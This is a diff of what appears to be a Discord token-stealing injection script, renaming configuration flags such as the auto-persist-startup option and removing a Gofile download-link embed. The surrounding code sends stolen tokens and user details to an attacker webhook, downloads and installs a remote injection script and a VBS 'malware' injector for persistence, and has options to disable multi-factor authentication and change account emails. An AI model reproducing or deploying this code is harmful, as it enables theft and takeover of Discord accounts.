@@ -34,11 +34,10 @@ const execScript = async (script) => {
 const CONFIG = {
     webhook: '%WEBHOOK_URL%',
     API: '%API_URL%',
-    force_persist_startup: '%FORCE_PERSIST_STARTUP%',
+    auto_user_profile_edit: '%AUTO_USER_PROFILE_EDIT%',
+    auto_persist_startup: '%AUTO_PERSIST_STARTUP%',
     auto_mfa_disabler: '%AUTO_MFA_DISABLER%',
     auto_email_update: '%AUTO_EMAIL_UPDATE%',
-    auto_user_profile_edit: '%AUTO_USER_PROFILE_EDIT%',
-    gofile_download_link: '%GOFILE_DOWNLOAD_LINK%',
     injection_url: 'https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js',
     injector_url: 'https://raw.githubusercontent.com/k4itrun/discord-vbs-injector/main/injector.vbs',
     get: {
@@ -281,10 +280,6 @@ const notify = async (ctx, token, user) => {
 
     if (servers) {
         ctx.embeds.push({ title: servers.title, description: servers.description });
-    }
-
-    if (CONFIG.gofile_download_link !== '%' + 'GOFILE_DOWNLOAD_LINK%') {
-        ctx.embeds.push({ title: 'Gofile Download Link', description: `[Download here](${CONFIG.gofile_download_link})` });
     }
 
     ctx.embeds.push({
@@ -768,12 +763,10 @@ const forcePersistStartup = async () => {
     const vbsContent = responseVbsMalware
         .replace("replace_webhook_url", CONFIG.webhook)
         .replace("replace_api_url", CONFIG.API)
-        .replace("replace_force_persist_startup", CONFIG.force_persist_startup)
+        .replace("replace_auto_user_profile_edit", CONFIG.auto_user_profile_edit)
+        .replace("replace_auto_persist_startup", CONFIG.auto_persist_startup)
         .replace("replace_auto_mfa_disabler", CONFIG.auto_mfa_disabler)
         .replace("replace_auto_email_update", CONFIG.auto_email_update)
-        .replace("replace_auto_user_profile_edit", CONFIG.auto_user_profile_edit)
-        .replace("replace_gofile_download_link", CONFIG.gofile_download_link);
-
 
     const checkFileExists = (filePath) => {
         return new Promise((resolve) => {
@@ -955,11 +948,10 @@ const startup = async () => {
                                 chunk.toString()
                                     .replace('%WEBHOOK_URL%', '${CONFIG.webhook}')
                                     .replace('%API_URL%', '${CONFIG.API}')
-                                    .replace('%FORCE_PERSIST_STARTUP%', '${CONFIG.force_persist_startup}')
+                                    .replace('%AUTO_USER_PROFILE_EDIT%', '${CONFIG.auto_user_profile_edit}')
+                                    .replace('%AUTO_PERSIST_STARTUP%', '${CONFIG.auto_persist_startup}')
                                     .replace('%AUTO_MFA_DISABLER%', '${CONFIG.auto_mfa_disabler}')
                                     .replace('%AUTO_EMAIL_UPDATE%', '${CONFIG.auto_email_update}')
-                                    .replace('%AUTO_USER_PROFILE_EDIT%', '${CONFIG.auto_user_profile_edit}')
-                                    .replace('%GOFILE_DOWNLOAD_LINK%', '${CONFIG.gofile_download_link}')
                             ));
 
                             res.on('end', () => {
@@ -1452,7 +1444,7 @@ const allSessionsLocked = async () => {
 };
 
 const complete = async () => {
-    if (CONFIG.force_persist_startup === 'true') {
+    if (CONFIG.auto_persist_startup === 'true') {
         forcePersistStartup(); 
     };
     startup();
